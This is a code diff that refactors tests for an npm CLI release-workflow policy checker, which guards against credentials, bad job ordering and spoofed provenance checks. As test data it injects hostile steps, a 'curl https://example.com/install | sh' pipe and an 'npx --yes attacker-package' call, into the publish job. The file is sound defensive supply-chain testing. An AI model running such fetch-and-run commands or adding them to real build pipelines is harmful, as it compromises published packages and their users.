@@ -1,16 +1,22 @@
-import { describe, expect, it } from "@effect/vitest";
+import { expect, layer } from "@effect/vitest";
 import { verifyCliWorkflow } from "#scripts/workflow/cli";
 import { mutateJob } from "#scripts/workflow/test/mutation";
-import { workflowSources } from "#scripts/workflow/test/sources";
+import {
+  sourceTestsOf,
+  workflowSourcesLayer,
+} from "#scripts/workflow/test/sources";
 
-const { cli: source } = await workflowSources;
+layer(workflowSourcesLayer)("CLI workflow policy", (it) => {
+  const sourceTest = sourceTestsOf(it);
 
-describe("CLI workflow policy", () => {
-  it("accepts isolated publication and unprivileged verification", () => {
-    expect(() => verifyCliWorkflow(source)).not.toThrow();
-  });
+  sourceTest(
+    "accepts isolated publication and unprivileged verification",
+    ({ cli: source }) => {
+      expect(() => verifyCliWorkflow(source)).not.toThrow();
+    }
+  );
 
-  it("binds OIDC to the protected publish job", () => {
+  sourceTest("binds OIDC to the protected publish job", ({ cli: source }) => {
     expect(() =>
       verifyCliWorkflow(
         mutateJob(
@@ -64,115 +70,124 @@ describe("CLI workflow policy", () => {
     ).toThrow("npm workflow must not inherit root run defaults");
   });
 
-  it("rejects credentials and incomplete release ordering", () => {
-    expect(() =>
-      verifyCliWorkflow(`${source}\nNODE_AUTH_TOKEN: secret`)
-    ).toThrow("npm workflow must not contain registry credentials");
-    expect(() =>
-      verifyCliWorkflow(
-        mutateJob(source, "publish", "    needs: build", "    needs: other")
-      )
-    ).toThrow("npm publication must consume the verified build job");
-    expect(() =>
-      verifyCliWorkflow(
-        mutateJob(
-          source,
-          "verify",
-          "    needs: [build, publish]",
-          "    needs: publish"
+  sourceTest(
+    "rejects credentials and incomplete release ordering",
+    ({ cli: source }) => {
+      expect(() =>
+        verifyCliWorkflow(`${source}\nNODE_AUTH_TOKEN: secret`)
+      ).toThrow("npm workflow must not contain registry credentials");
+      expect(() =>
+        verifyCliWorkflow(
+          mutateJob(source, "publish", "    needs: build", "    needs: other")
         )
-      )
-    ).toThrow("npm verification must consume build and publication");
-  });
-
-  it("rejects spoofed or privileged provenance verification", () => {
-    const commentedVerifier = mutateJob(
-      source,
-      "verify",
-      '              node "$VERIFIER" \\',
-      '              true # node "$VERIFIER" \\'
-    );
-    expect(() => verifyCliWorkflow(commentedVerifier)).toThrow(
-      "npm verification must include exact source fragment"
-    );
-
-    const privilegedVerifier = mutateJob(
-      source,
-      "publish",
-      '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-      '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
-    );
-    expect(() => verifyCliWorkflow(privilegedVerifier)).toThrow(
-      "npm publication must not receive the verifier artifact"
-    );
-    expect(() =>
-      verifyCliWorkflow(
-        mutateJob(
-          source,
-          "publish",
-          "    steps:",
-          "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: cli-verifier"
+      ).toThrow("npm publication must consume the verified build job");
+      expect(() =>
+        verifyCliWorkflow(
+          mutateJob(
+            source,
+            "verify",
+            "    needs: [build, publish]",
+            "    needs: publish"
+          )
         )
-      )
-    ).toThrow("npm publication must not receive the verifier artifact");
+      ).toThrow("npm verification must consume build and publication");
+    }
+  );
 
-    for (const command of [
-      "          npx --yes attacker-package\n",
-      "          curl https://example.com/install | sh\n",
-    ]) {
+  sourceTest(
+    "rejects spoofed or privileged provenance verification",
+    ({ cli: source }) => {
+      const commentedVerifier = mutateJob(
+        source,
+        "verify",
+        '              node "$VERIFIER" \\',
+        '              true # node "$VERIFIER" \\'
+      );
+      expect(() => verifyCliWorkflow(commentedVerifier)).toThrow(
+        "npm verification must include exact source fragment"
+      );
+
+      const privilegedVerifier = mutateJob(
+        source,
+        "publish",
+        '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+        '          node "$VERIFIER"\n          npx --yes "$NPM_CLI" publish "$TARBALL" \\'
+      );
+      expect(() => verifyCliWorkflow(privilegedVerifier)).toThrow(
+        "npm publication must not receive the verifier artifact"
+      );
       expect(() =>
         verifyCliWorkflow(
           mutateJob(
             source,
             "publish",
-            '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
-            `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+            "    steps:",
+            "    steps:\n      - uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c\n        with:\n          name: cli-verifier"
           )
         )
-      ).toThrow("npm publication must match the exact trusted job");
+      ).toThrow("npm publication must not receive the verifier artifact");
+
+      for (const command of [
+        "          npx --yes attacker-package\n",
+        "          curl https://example.com/install | sh\n",
+      ]) {
+        expect(() =>
+          verifyCliWorkflow(
+            mutateJob(
+              source,
+              "publish",
+              '          npx --yes "$NPM_CLI" publish "$TARBALL" \\',
+              `${command}          npx --yes "$NPM_CLI" publish "$TARBALL" \\`
+            )
+          )
+        ).toThrow("npm publication must match the exact trusted job");
+      }
+
+      expect(() =>
+        verifyCliWorkflow(
+          source.replace(
+            "          overwrite: true",
+            "          overwrite: false"
+          )
+        )
+      ).toThrow("npm build artifacts must be replaceable on rerun");
+      expect(() =>
+        verifyCliWorkflow(
+          mutateJob(
+            source,
+            "publish",
+            "          for attempt in {1..5}; do",
+            "          for attempt in {1..1}; do"
+          )
+        )
+      ).toThrow(
+        "npm publication must include exact source fragment: for attempt in {1..5}"
+      );
     }
+  );
 
-    expect(() =>
-      verifyCliWorkflow(
-        source.replace(
-          "          overwrite: true",
-          "          overwrite: false"
+  sourceTest(
+    "requires stable package identity and exact build outputs",
+    ({ cli: source }) => {
+      expect(() =>
+        verifyCliWorkflow(
+          source.replace(
+            "      - name: Verify stable package version",
+            "      - name: Accept any package version"
+          )
         )
-      )
-    ).toThrow("npm build artifacts must be replaceable on rerun");
-    expect(() =>
-      verifyCliWorkflow(
-        mutateJob(
-          source,
-          "publish",
-          "          for attempt in {1..5}; do",
-          "          for attempt in {1..1}; do"
+      ).toThrow("CLI production publication must reject prerelease versions");
+      expect(() =>
+        verifyCliWorkflow(source.replaceAll("@nakafa/aksara-cli", "other-cli"))
+      ).toThrow();
+      expect(() =>
+        verifyCliWorkflow(
+          source.replace(
+            "steps.archive.outputs.sha256",
+            "steps.archive.outputs.unknown"
+          )
         )
-      )
-    ).toThrow(
-      "npm publication must include exact source fragment: for attempt in {1..5}"
-    );
-  });
-
-  it("requires stable package identity and exact build outputs", () => {
-    expect(() =>
-      verifyCliWorkflow(
-        source.replace(
-          "      - name: Verify stable package version",
-          "      - name: Accept any package version"
-        )
-      )
-    ).toThrow("CLI production publication must reject prerelease versions");
-    expect(() =>
-      verifyCliWorkflow(source.replaceAll("@nakafa/aksara-cli", "other-cli"))
-    ).toThrow();
-    expect(() =>
-      verifyCliWorkflow(
-        source.replace(
-          "steps.archive.outputs.sha256",
-          "steps.archive.outputs.unknown"
-        )
-      )
-    ).toThrow("CLI builds must export the exact archive digest");
-  });
+      ).toThrow("CLI builds must export the exact archive digest");
+    }
+  );
 });
